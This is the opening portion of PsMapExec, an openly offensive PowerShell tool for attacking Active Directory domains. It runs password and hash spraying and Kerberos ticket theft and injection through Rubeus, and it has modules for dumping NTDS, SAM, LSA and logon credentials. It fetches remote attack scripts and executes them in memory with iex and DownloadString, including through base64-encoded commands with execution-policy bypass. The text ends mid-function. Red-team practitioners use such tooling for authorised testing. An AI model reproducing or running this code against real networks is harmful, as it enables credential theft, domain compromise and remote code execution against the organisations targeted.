Function PsMapExec{


[CmdletBinding()]
Param(
    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [String]$Command = '',

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [String]$Targets = '',

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [String]$Domain = "$env:USERDNSDOMAIN",

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [String]$Username = "",

    [Parameter(Mandatory=$True, ValueFromPipeline=$true)]
    [String]$Method = "",

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [String]$Module = "",

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [String]$Hash = "",

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [String]$Password = "",

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [String]$UserDomain = "",

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [String]$LocalFileServer = "",

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [int]$Threads = 30,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [switch]$Force,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [switch]$LocalAuth,
    
    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [switch]$CurrentUser = $True,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [switch]$SuccessOnly,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [switch]$ShowOutput,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [String]$Ticket = "",

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [Switch]$AccountAsPassword,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [Switch]$EmptyPassword,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [int]$Port = "",

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [Switch]$NoParse,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [String]$SprayHash = "",

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [String]$SprayPassword = "",

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [switch]$NoBanner,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [string]$DomainController,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [int]$Timeout = 3000,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [switch]$Flush,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [switch]$Scramble,

    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
    [switch]$Rainbow
)

# Check for mandatory parameter


$startTime = Get-Date
Set-Variable MaximumHistoryCount 32767

# Set the targets variable if not provided when spraying
if ($Method -eq "Spray" -and $Targets -eq ""){
$Targets = "all"
}


################################################################################################################
###################################### Banner and version information ##########################################
################################################################################################################

$Banner = @("
  _____   _____ __  __          _____  ________   ________ _____ 
 |  __ \ / ____|  \/  |   /\   |  __ \|  ____\ \ / /  ____/ ____|
 | |__) | (___ | \  / |  /  \  | |__) | |__   \ V /| |__ | |     
 |  ___/ \___ \| |\/| | / /\ \ |  ___/|  __|   > < |  __|| |     
 | |     ____) | |  | |/ ____ \| |    | |____ / . \| |___| |____ 
 |_|    |_____/|_|  |_/_/    \_\_|    |______/_/ \_\______\_____|
                                                                 

Github  : https://github.com/The-Viper-One
Version : 0.4.6")

if (!$NoBanner){
Write-Output $Banner
}

function Test-DomainJoinStatus {
    if ((Get-WmiObject Win32_ComputerSystem).PartOfDomain) {
        return $true
    } else {
        return $false
    }
}

$DomainJoined = Test-DomainJoinStatus

if ($DomainJoined) {
    if ($NoBanner){Write-Output ""}
    Write-Output "Domain  : Yes"
} elseif (!$DomainJoined) {
    if ($NoBanner){Write-Output ""}
    Write-Output "Domain  : No"
}

if ($Flush){
$global:DomainAdmins = $null
$global:EnterpriseAdmins = $null
$global:ServerOperators = $null
$global:AccountOperators = $null
$FQDNDomainPlusDomainAdmins = $null
$FQDNDomainPlusEnterpriseAdmins = $null
$FQDNDomainPlusServerOperators = $null
$FQDNDomainPlusAccountOperators = $null

# Target Variables
$Global:TargetsServers = $null
$Global:TargetsWorkstations = $null
$Global:TargetsDomainControllers = $null
$Global:TargetsAll = $null

}

# If no targets have been provided
if (-not $Targets -and $Method -ne "Spray") {
    
    Write-Host
    Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
    Write-host "You must provide a value for -targets (all, servers, DCs, Workstations)"
    return
}

if ($Targets -match "^\*+$") {
    
    Write-Host
    Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
    Write-Host "The target cannot consist only of asterisks. Please specify a more specific target."
    return
}

if ($Targets -match "^\*.*|.*\*$"){Write-Host "Targets : Wildcard matching"}
elseif ($Targets -eq "Workstations"){Write-Host "Targets : Workstations"}
elseif ($Targets -eq "Servers"){Write-Host "Targets : Servers"}
elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers"){Write-Host "Targets : Domain Controllers"}
elseif ($Targets -eq "All" -or $Targets -eq "Everything"){Write-Host "Targets : All"}
elseif ($Targets -notmatch "\*"){$IsFile = Test-Path $Targets ; if ($IsFile){Write-Host "Targets : File ($Targets)"}}

function IsIPAddressOrCIDR {
    param ([string]$Target)

    # Regular expressions for IP address and CIDR notation
    $ipPattern = '^\d{1,3}(\.\d{1,3}){3}$'
    $cidrPattern = '^\d{1,3}(\.\d{1,3}){3}\/\d{1,2}$'

    # Check if the target matches either the IP address or CIDR pattern
    return $Target -match $ipPattern -or $Target -match $cidrPattern
}


# Check if Targets is a valid IP or CIDR
if (IsIPAddressOrCIDR $Targets) {
    Write-Host
    Write-Error "IP Address not yet supported"
    continue
} else {$IPAddress = $False}

################################################################################################################
####################################### Some logic based checking ##############################################
################################################################################################################
if ($Method -ne "") {
    switch ($Method) {
        "All" {}
        "WinRM" {}
        "MSSQL" {}
        "SMB" {}
        "WMI" {}
        "RDP" {}
        "GenRelayList" {}
        "SessionHunter" {}
        "Spray" {}
        "VNC" {}

        default {
            
            Write-Host
            Write-Host "[*] " -ForegroundColor Yellow -NoNewline
            Write-Host "Invalid Method specified"
            Write-Host "[*] " -ForegroundColor Yellow -NoNewline
            Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
            return
        }
    }
}

if ($Module -ne "") {
    switch ($Module) {
        "Amnesiac" {}
        "ConsoleHistory" {}
        "Files" {}
        "KerbDump" {}
        "eKeys" {}
        "LogonPasswords" {}
        "LSA" {}
        "NTDS" {}
        "SAM" {}
        "Test"{}
        "Tickets" {}

        default {
            
            Write-Host
            Write-Host "[*] " -ForegroundColor Yellow -NoNewline
            Write-Host "Invalid Module specified"
            Write-Host "[*] " -ForegroundColor Yellow -NoNewline
            Write-Host "Specify either: Files, ConsoleHistory, KerbDump, eKeys, LogonPasswords, LSA, NTDS, SAM, Tickets, Amnesiac"
            return
        }
    }
}

if ($Module -eq "NTDS" -and ($Targets -in @("Everything", "Workstations", "all", "Servers"))) {
    
    Write-Host
    Write-Host "[*] " -ForegroundColor Yellow -NoNewline
    Write-Host "You must specify a single domain controller (e.g., DC01.Security.local) or 'DC', 'DCs', 'Domain Controllers' as a target when using the NTDS module"
    Write-Host "[*] " -ForegroundColor Yellow -NoNewline
    Write-Host "For example: -Targets DCs, -Targets DC01.Security.local"
    return
}


if ($Threads -lt 1 -or -not [int]::TryParse($Threads, [ref]0)) {
        
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Threads value should not be less than 1"
        return
}

if ($Threads -gt 100) {
        
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Threads value should not be than 100. This will likely cause results to be missed."
        return
}



if (!$DomainJoined){$CurrentUser = $False}

if ($Domain -eq "" -and $DomainJoined -eq $False){
    
    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-host "This system appears to be a non-domain joined system. You must specify a target Domain ""-Domain Security.local"""
    return
}

if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne ""){$CurrentUser = $False}
if ($Method -eq "Spray" -and $DomainJoined -eq $True){$CurrentUser = $True}
if ($Method -eq "GenRelayList"){$CurrentUser = $True}
if ($Method -eq "RDP"){$CurrentUser = $True}
if ($Method -eq "MSSQL"){$CurrentUser = $True}



if ($Method -eq ""  -and !$SessionHunter -and !$Spray){
        
        Write-Host
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "No method specified"
        return
}


if ($Method -eq "RDP") {
    if ($Hash -ne "") {
        
        Write-Host
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Hash authentication not currently supported with RDP"
        return
    }
    
    if ($Ticket -ne "") {
        
        Write-Host
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Ticket authentication not currently supported with RDP"
        return
    }
    
    if ($Username -eq "" -or $Password -eq "") {
        
        Write-Host
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "-Username and -Password parameters required when using the method RDP"
        return
    }
}


if ($Method -eq "VNC") {
    if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne "") {
        $CurrentUser = $True
        
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host " Method VNC does not support authentication material, it simply checks if No Auth is enabled."
        Write-Host
        Start-sleep -Seconds 5
    }
 } 

if ($Method -eq "Spray"){

if (!$EmptyPassword -and !$AccountAsPassword -and $SprayHash -eq "" -and $SprayPassword -eq ""){

Write-Host
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "We need something to spray"
Write-Host
Write-host "PsMapExec -Method Spray -SprayPassword [Password]"
Write-host "PsMapExec -Method Spray -SprayHash [Hash]"
Write-host "PsMapExec -Method Spray -AccountAsPassword"
Write-host "PsMapExec -Method Spray -EmptyPassword"
return

}

if ($SprayHash -ne "" -and $SprayPassword -ne ""){

Write-Host
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Hash and Password detected"
return

}

if ($EmptyPassword -and $SprayHash -ne "" -or ($EmptyPassword -and $SprayPassword -ne "")){

Write-Host
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Password or hash value provided with -EmptyPassword"
return

}

if ($AccountAsPassword -and $SprayHash -ne "" -or ($AccountAsPassword -and $SprayPassword -ne "")){

Write-Host
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Password or hash value provided with -EmptyPassword"
return

}

if ($AccountAsPassword -and $EmptyPassword){

Write-Host
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
return
    
    }
}

if ($Method -eq "WinRM" -and !$DomainJoined){

Write-Host
Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
Write-Host "Be aware, using WinRM from a non-domain joined system typically does not work"

Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
Write-Host "This is default and expected behaviour. This system will need to be configured as a trusted host on the remote system to allow access"
}

if ($Method -eq "MSSQL" -and $LocalAuth -and (($Username -eq "" -and $Password -ne "") -or ($Username -ne "" -and $Password -eq ""))) {
    
    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Looks like you are missing either -Username or -Password"
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Do not provide a -Username or -Password if you want to check with current user context"
    return
}

if ($Method -eq "MSSQL" -and !$LocalAuth -and (($Username -eq "" -and $Password -ne "") -or ($Username -ne "" -and $Password -eq ""))) {
    
    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Looks like you are missing either -Username or -Password"
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Do not provide a -Username or -Password if you want to check with current user context"
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "You can append -LocalAuth if you wish to authenticate with a -Username and -Password as SQL Authentication"
    return
}

if ($Rainbow){
    if ($Module -ne "Sam" -and $Module -ne "LogonPasswords" -and $Module -ne "NTDS"){
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "The switch -Rainbow is only compatible with the Modules 'LogonPasswords', 'NTDS', and 'SAM'"
        return
    }
}


# Check if this conflicts with anything
if ($LocalAuth){$CurrentUser = $True}

# Check script modules
$InvokeRubeusLoaded = Get-Command -Name "Invoke-Rubeus" -ErrorAction "SilentlyContinue"
################################################################################################################
######################################### External Script variables ############################################
################################################################################################################

$PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
$KirbyURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"
$NTDSURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-NTDS.ps1"
$Amn3s1acURL = "https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1"

# Check if $LocalFileServer is not NULL
if (![string]::IsNullOrEmpty($LocalFileServer)) {
    # Regular expression pattern to validate an IP address
    $ipRegex = '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'

    if ($LocalFileServer -match $ipRegex) {
        # Update URLs to use the provided local file server's IP address
        $PandemoniumURL = "http://$LocalFileServer/Invoke-Pandemonium.ps1"
        $KirbyURL = "http://$LocalFileServer/Kirby.ps1"
    }
    else {
        # If $LocalFileServer is not a valid IP address, show an error message and return
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "The provided value '$LocalFileServer' is not a valid IP address."
        return
    }
}




################################################################################################################
########################################### Current User Ticket ################################################
################################################################################################################

# Check if the current user is an administrator, used for ticket functions
$CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

$Klist = -not (& klist | Select-String -Pattern "Cached Tickets: \(0\)")
if (!$klist){Write-verbose "No Kerberos tickets in cache"}  

function GetCurrentUserTicket {
iex $Global:rbs
    if ($Method -ne "RDP") {
        if ($Method -ne "MSSQL") {
            if ($DomainJoined) {
                if ($Klist) {
                    try {
                        Write-Verbose "Attempting to obtain current user ticket"
                        if ($DomainController -ne "") {
                            Invoke-Rubeus tgtdeleg /nowrap /domain:$domain /dc:$DomainController | Out-String
                        } else {
                            $BaseTicket = Invoke-Rubeus tgtdeleg /nowrap | Out-string
                        }
                        $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                    } catch {
                        try {
                            if (!$CheckAdmin) {
                                $BaseTicket = Invoke-Rubeus dump /service:krbtgt /nowrap | Out-String
                                $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()

                                if ($Global:OriginalUserTicket -notlike "doI*") {
                                    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
                                    Write-Host "Unable to retrieve any Kerberos tickets"
                                    return
                                }
                            } elseif ($CheckAdmin) {
                                $BaseTicket = Invoke-Rubeus dump /service:krbtgt /username:$env:username /nowrap | Out-String
                                $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()

                                if ($Global:OriginalUserTicket -notlike "doI*") {
                                    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
                                    Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
                                    return
                                }
                            }
                        } catch {
                            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                            Write-Host "Unable to retrieve any Kerberos tickets"
                            return
                        }
                    }
                }
            }
        }
    }
}

################################################################################################################
########################################### Ticket processing ##################################################
################################################################################################################

function ProcessTicket {
    
    if ($Method -ne "RDP") {
        # Check if a ticket has been provided
        if ($Ticket -ne "") {
            if ($Ticket -and (Test-Path -Path $Ticket -PathType Leaf)) {
                $Ticket = Get-Content -Path $Ticket -Raw
            }

            $ProvidedTicket = Invoke-Rubeus describe /ticket:$Ticket

            # Check if an error has occurred
            if ($ProvidedTicket -like "*/ticket:X*") {
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Invalid ticket provided"
                return
            }

            # Use regular expressions to extract ticket information
            $TicketUsername = [regex]::Match($ProvidedTicket, "UserName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
            $TicketRealm = [regex]::Match($ProvidedTicket, "UserRealm\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
            $TicketExpiry = [regex]::Match($ProvidedTicket, "EndTime\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
            $TicketType = [regex]::Match($ProvidedTicket, "ServiceName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value

            # Display the extracted information
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Supplied Ticket Details"

            if ($TicketType -like "krbtgt/*") { Write-Host "    - Type     : TGT" }
            if ($TicketType -notlike "krbtgt/*") { Write-Host "    - Type     : TGS" }

            Write-Host "    - UserName : $TicketUsername"
            Write-Host "    - Realm    : $TicketRealm"
            Write-Host "    - Expires  : $TicketExpiry"
            Write-Host

            # Attempt to inject the ticket into the current session
            if ($DomainController -ne "") {
                $InjectTicket = Invoke-Rubeus ptt /ticket:$Ticket /domain:$Domain /dc:$DomainController
            } else {
                $InjectTicket = Invoke-Rubeus ptt /ticket:$Ticket /domain:$Domain
            }

            if ($InjectTicket -like "*Error 1398*") {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Ticket expired"
                klist purge | Out-Null

                if ($DomainController -ne "") {
                    Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain /dc:$DomainController | Out-Null
                } else {
                    Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
                }
                return
            }
        } elseif ($Password -ne "") {
            klist purge | Out-Null

            if ($UserDomain -ne "") {
                if ($DomainController -ne "") {
                    $AskPassword = Invoke-Rubeus asktgt /user:$Username /domain:$UserDomain /password:$Password /dc:$DomainController /opsec /force /ptt
                } else {
                    $AskPassword = Invoke-Rubeus asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt

                }
            } elseif ($UserDomain -eq "") {
                if ($DomainController -ne "") {
                    $AskPassword = Invoke-Rubeus asktgt /user:$Username /domain:$Domain /password:$Password /dc:$DomainController /opsec /force /ptt
                    Write-host $AskPassword
                } else {
                    $AskPassword = Invoke-Rubeus asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt
                }
            }

            if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*") {
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Incorrect password or username"
                klist purge | Out-Null
                if ($DomainController -ne "") {
                    Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain /dc:$DomainController | Out-Null
                } else {
                    Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
                }
                return
            }

            if ($AskPassword -like "*Unhandled Rubeus exception:*") {
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Incorrect password or username"
                klist purge | Out-Null
                if ($DomainController -ne "") {
                    Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain /dc:$DomainController | Out-Null
                } else {
                    Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
                }
                return
            }
        } elseif ($Hash -ne "") {
            if ($Hash.Length -eq 32) {
                klist purge | Out-Null

                if ($UserDomain -ne "") {
                    if ($DomainController -ne "") {
                        $AskRC4 = Invoke-Rubeus asktgt /user:$Username /domain:$UserDomain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                    } else {
                        $AskRC4 = Invoke-Rubeus asktgt /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt
                    }
                }
                if ($UserDomain -eq "") {
                    if ($DomainController -ne "") {
                        $AskRC4 = Invoke-Rubeus asktgt /user:$Username /domain:$Domain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                    } else {
                        $AskRC4 = Invoke-Rubeus asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt
                    }
                }

                if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Incorrect hash or username"
                    klist purge | Out-Null
                    if ($DomainController -ne "") {
                        Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain /dc:$DomainController | Out-Null
                    } else {
                        Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
                    }
                    return
                }

                if ($AskRC4 -like "*Unhandled Rubeus exception:*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Incorrect hash or username"
                    klist purge | Out-Null
                    if ($DomainController -ne "") {
                        Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain /dc:$DomainController | Out-Null
                    } else {
                        Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
                    }
                    return
                }
            } elseif ($Hash.Length -eq 64) {
                klist purge | Out-Null

                if ($UserDomain -ne "") {
                    if ($DomainController -ne "") {
                        $Ask256 = Invoke-Rubeus asktgt /user:$Username /domain:$UserDomain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
                    } else {
                        $Ask256 = Invoke-Rubeus asktgt /user:$Username /domain:$UserDomain /aes256:$Hash /opsec /force /ptt
                    }
                }
                if ($UserDomain -eq "") {
                    if ($DomainController -ne "") {
                        $Ask256 = Invoke-Rubeus asktgt /user:$Username /domain:$Domain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
                    } else {
                        $Ask256 = Invoke-Rubeus asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt
                    }
                }

                if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Incorrect hash or username"
                    klist purge | Out-Null
                    if ($DomainController -ne "") {
                        Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain /dc:$DomainController | Out-Null
                    } else {
                        Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
                    }
                    return
                }

                if ($Ask256 -like "*Unhandled Rubeus exception:*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Incorrect hash or username"
                    klist purge | Out-Null
                    if ($DomainController -ne "") {
                        Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /$Domain /dc:$DomainController | Out-Null
                    } else {
                        Invoke-Rubeus ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
                    }
                    return
                }
            } else {
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
                Write-Host 
                Write-Host
                return
            }
        }
    }
}

################################################################################################################
############################################## Load Amnesiac ###################################################
################################################################################################################

if ($Module -eq "Amnesiac") {
    if ([string]::IsNullOrEmpty($Global:AmnesiacPID) -or (Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -eq $null) {
        $Global:PN = $null
        $Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) -join ''
        
        if (!$Global:SID) {
            $Global:SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
        }
        
        $finalcommand = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac -ScanMode -GlobalPipeName $PN"
        $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))
        iex $Global:rbs

        if (!$CurrentUser) {
            Write-Verbose "Starting Amnesiac with impersonation"
            GetCurrentUserTicket
            $process = Invoke-Rubeus createnetonly /program:"c:\windows\system32\cmd.exe /c powershell.exe -noexit -NoProfile -EncodedCommand $encodedCommand" /username:$env:Username /password:Fakepass /domain:$Domain /show /ptt /ticket:$Global:OriginalUserTicket
            $pattern = "\[\+\]\sProcessID\s{7}:\s(\d+)"
            
            # Find the created process ID
            $match = [regex]::Match($process, $pattern)
            if ($match.Success) {
                $Global:AmnesiacPID = $match.Groups[1].Value
            } 
        }
        
        if ($CurrentUser) {
            Write-Verbose "Starting Amnesiac without impersonation"
            $process = Start-Process cmd.exe -ArgumentList "/c powershell.exe -ep bypass -c `"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1'); Amnesiac -ScanMode -GlobalPipeName $PN`"" -PassThru
            $Global:AmnesiacPID = $process.Id
        }
    } else {
        Write-Verbose "Amnesiac is already running"
        if ($Scramble){$Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) -join ''}
        elseif ((Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -ne $null) {
            $Global:PN = $Global:PN
        } else {
            $Global:AmnesiacPID = $null
        }
    }
}


################################################################################################################
######################################### Console Display variables ############################################
################################################################################################################

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength,
        [string]$successfulProtocols
    )

    # Prefix
    switch ($Method) {
        "SMB" { Write-Host "SMB" -ForegroundColor "Yellow" -NoNewline }
        "WMI" { Write-Host "WMI" -ForegroundColor "Yellow" -NoNewline }
        "WinRM" { Write-Host "WinRM" -ForegroundColor "Yellow" -NoNewline }
        "All" { Write-Host "ALL" -ForegroundColor "Yellow" -NoNewline }
        "GenRelayList" { Write-Host "GenRelayList" -ForegroundColor "Yellow" -NoNewline }
        "SessionHunter" { Write-Host "SessionHunter" -ForegroundColor "Yellow" -NoNewline }
        "VNC" { Write-Host "VNC" -ForegroundColor "Yellow" -NoNewline }
    }
    
    Write-Host "   " -NoNewline

    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
        $IP = $Result.Address.IPAddressToString
        Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {
        Write-Host ("{0,-16}" -f $IP) -NoNewline
    }

    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

################################################################################################################
########################################### Initial Directory Setup ############################################
################################################################################################################

$WorkingDirectory = (Get-Item -Path ".\").FullName

try {
    $testFilePath = Join-Path $WorkingDirectory "Test.PME"
    New-Item -ItemType "File" -Name "Test.PME" -Path $WorkingDirectory -Force -ErrorAction "Stop" | Out-Null
    Remove-Item -Path $testFilePath -Force | Out-Null
} catch {
    Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Current directory is not writable, change to a different directory and try again"
    return
}

$PME = Join-Path $WorkingDirectory "PME"
$SAM = Join-Path $PME "SAM"
$MSSQL = Join-Path $PME "MSSQL"
$LogonPasswords = Join-Path $PME "LogonPasswords"
$SMB = Join-Path $PME "SMB"
$Tickets = Join-Path $PME "Tickets"
$KerbDump = Join-Path $Tickets "KerbDump"
$MimiTickets = Join-Path $Tickets "MimiTickets"
$ekeys = Join-Path $PME "eKeys"
$LSA = Join-Path $PME "LSA"
$ConsoleHistory = Join-Path $PME "Console History"
$Sessions = Join-Path "$PME" "Sessions"
$UserFiles = Join-Path "$PME" "User Files"
$Spraying = Join-Path $PME "Spraying"
$VNC = Join-Path $PME "VNC"
$NTDS = Join-Path $PME "NTDS"

  $directories = @(
    $PME, $SAM, $LogonPasswords, $MSSQL, $SMB, $Tickets, $ekeys, 
    $LSA, $KerbDump, $MimiTickets, $ConsoleHistory, $Sessions, 
    $UserFiles, $Spraying, $VNC, $NTDS
)

foreach ($directory in $directories) {
    if (-not (Test-Path $directory)) {
        New-Item -ItemType Directory -Force -Path $directory | Out-Null
        if ($directory -eq $PME) {
            Write-Host
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "Created directory for PME at $directory"
            Write-Host
            Start-sleep -seconds "3"
        }
    }
}

################################################################################################################
################################### Loads ticket functions into memory #########################################
################################################################################################################

if (!$CurrentUser -or $SprayHash) {
    if (-not (Get-Command 'Invoke-Rubeus' -ErrorAction "SilentlyContinue")) {
        Write-Verbose "Loading ticket function"
        try {
            if ($global:rbs) {
                IEX $global:rbs
            } else {
                Write-Warning "rbs script block is null"
            }
        } catch {}
    } else {
        Write-Verbose "Ticket function already loaded"
    }
}


################################################################################################################
################################################# Function: RestoreTicket ######################################
################################################################################################################
Function RestoreTicket {
    if (!$CurrentUser) {
        if ($Klist -eq $False) {
            Write-Verbose "Clearing tickets as no tickets in original cache"
            klist purge | Out-Null
            return
        }

        if ($Method -ne "GenRelayList") {
        Write-Verbose "Restoring Ticket"
            klist purge | Out-Null
